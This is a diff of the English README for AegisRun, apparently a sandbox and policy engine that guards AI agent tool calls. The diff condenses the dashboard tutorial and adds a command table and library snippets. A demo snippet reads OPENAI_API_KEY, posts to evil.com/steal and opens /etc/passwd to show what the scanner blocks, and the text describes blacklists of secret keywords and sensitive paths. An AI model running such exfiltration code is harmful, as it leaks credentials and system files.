@@ -58,22 +58,28 @@ cargo run -- serve                # Web dashboard (port 9090)
 | **中文文档** | [README.md](../README.md) |
 
 
-## Web Dashboard Tutorial
+## Command Reference
+
+| Command | Effect |
+|---------|--------|
+| `moon run src/main` | MoonBit policy engine + demo |
+| `cargo run -- demo` | Rust policy engine demo |
+| `cargo run -- scan malware.py` | Scan script for threats |
+| `cargo run -- sandbox tool.wasm` | WASI physical isolation sandbox |
+| `cargo run -- serve` | Web dashboard (port 9090) |
+| `cargo run -- sandbox-monitor` | Runtime sandbox monitor |
+| `cargo run -- audit` | Audit log (JSONL) |
+| `cargo run -- verify tool.wasm id pub` | Tool signature verification |
+
+### Web Dashboard
 
 AegisRun provides a full-featured web management panel with bilingual UI (Chinese/English), real-time security scanning, and interactive MCP Agent tool caller.
 
-### Starting the Server
-
 ```cmd
-cd D:\moonbit\aegisrun\runtime
-cargo run -- serve
+cd runtime && cargo run -- serve
 ```
 
-Open `http://localhost:9090` in your browser to access the admin panel.
-
-### Dashboard Layout
-
-The admin panel is divided into three main sections:
+Open `http://localhost:9090` in your browser. The panel is divided into three main zones:
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -96,13 +102,7 @@ The admin panel is divided into three main sections:
 └─────────────────────────────────────────────────────────────┘
 ```
 
-### Language Switching
-
-Click the **中文** / **EN** buttons in the top-right corner to switch languages. All UI elements (including defense layer names and hint text) update in real-time.
-
-### Defense Layers
-
-The Dashboard page shows five defense layers with individual toggles:
+**Defense Layers** — Five layers with individual toggles:
 
 - **Runtime Sandbox** (Layer 1): Python audit hook monitoring
 - **Domain Blacklist** (Layer 2): Exact match + suffix wildcard + IP prefix
@@ -110,12 +110,10 @@ The Dashboard page shows five defense layers with individual toggles:
 - **Scanner** (Layer 4): Static code analysis
 - **Wasm Sandbox** (Layer 5): wasmtime WASI physical isolation
 
-### Security Detection
+**Security Detection** — Two modes in the Sandbox tab:
 
-Navigate to the **Sandbox** tab for two detection modes:
-
-**Static Scan** — Fast source code analysis for malicious patterns:
 ```python
+# Static scan
 import os
 key = os.environ.get("OPENAI_API_KEY")  # L2 [env] OPENAI_API_KEY — BLOCKED
 import requests
@@ -123,85 +121,32 @@ requests.post("https://evil.com/steal")  # L4 [host] evil.com — BLOCKED
 open("/etc/passwd")                      # L5 [path] /etc/passwd — BLOCKED
 ```
 
-**Runtime Sandbox** — Actual execution with Python audit hook interception:
-```
-Static: 3 | Runtime: 1 | Blocked: 4
-L2 [env] OPENAI_API_KEY — BLOCKED
-L4 [host] evil.com — BLOCKED
-L5 [path] /etc/passwd — BLOCKED
-[runtime-env] OPENAI_API_KEY — BLOCKED
-```
+**Policy Configuration** — Three methods: presets (Standard / Strict / Permissive), manual management, real-time sync.
 
-### MCP Agent Interactive Caller
+**API Endpoints:** `GET /api/policy` | `GET /api/stats` | `GET /api/audit` | `POST /api/scan` | `POST /api/sandbox-run` | `POST /mcp`
 
-Navigate to the **MCP Agent** tab:
+### Library Usage
 
-1. **View available tools** — Automatically loads all 9 MCP tools
-2. **Select a tool** — Choose from the dropdown menu
-3. **Fill parameters** — Provide JSON arguments
-4. **Execute** — Click "Call" and view results in real-time
-
-Example call:
-```json
-{
-  "jsonrpc": "2.0",
-  "id": 1,
-  "method": "tools/call",
-  "params": {
-    "name": "aegisrun.policy.check_domain",
-    "arguments": { "domain": "evil.com" }
-  }
-}
+```moonbit
+// MoonBit: moon add tuya-me/aegisrun
+let aegis = @lib.AegisRun::new("standard")
+aegis.check_domain("evil.com")          // → Deny
 ```
 
-### API Endpoints
-
-The dashboard exposes a complete RESTful API:
-
-- `GET /api/policy` — Get current policy
-- `GET /api/stats` — Get runtime statistics
-- `GET /api/audit` — Get audit log
-- `POST /api/scan` — Static code scan
-- `POST /api/sandbox-run` — Runtime sandbox detection
-- `POST /mcp` — MCP protocol endpoint
+```rust
+// Rust: cargo add aegisrun-runtime
+let policy = Policy::standard();
+policy.check_domain("evil.com");  // → false
+```
 
 ### MCP Integration
 
-`json
+```json
 { "mcpServers": { "aegisrun": { "url": "http://localhost:9090/mcp" } } }
-`
-
-9 tools: policy.summary, policy.check_domain, policy.check_path, policy.check_env, guard_tool_call, scan_code, scan_file, sandbox_python, sandbox_wasm
-
-### Security Policy
-
-Default rules include:
-- **Domain blacklist**: 7 known malicious C2 domains + 3 suffix TLDs
-- **IP prefix**: RFC 1918 private ranges (192.168.*/10.*/172.16.*)
-- **Path blacklist**: 22 sensitive paths (/etc/passwd, ~/.ssh/, C:\Windows\, etc.)
-- **Env patterns**: 36 sensitive patterns + KEY/SECRET/TOKEN/PASSWORD/CREDENTIAL keywords
-
-Rules are maintained in src/lib/core.mbt and can be extended via:
-1. **YAML presets** (presets/standard.yaml) — Editor-based configuration
-2. **policy.json** — Rust runtime persistence, auto-saved from web panel
-3. **Web dashboard** — Browser-based management with real-time sync
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
-
-**Quick start for contributors:**
-```bash
-git checkout -b feature/xxx
-# Write code, then:
-git commit -m "feat: description"
-git push origin feature/xxx
-# Create PR on GitLink
 ```
 
-**Low barrier:** Add domain blacklists, env patterns, extend scoring
-**Medium barrier:** CLI auto-completion, dashboard enhancements
-**High barrier:** wasmtime WASI host functions, distributed policy sync
+9 tools: policy.summary / policy.check_domain / policy.check_path / policy.check_env / guard_tool_call / scan_code / scan_file / sandbox_python / sandbox_wasm
+
 ## License
 
 Apache License 2.0
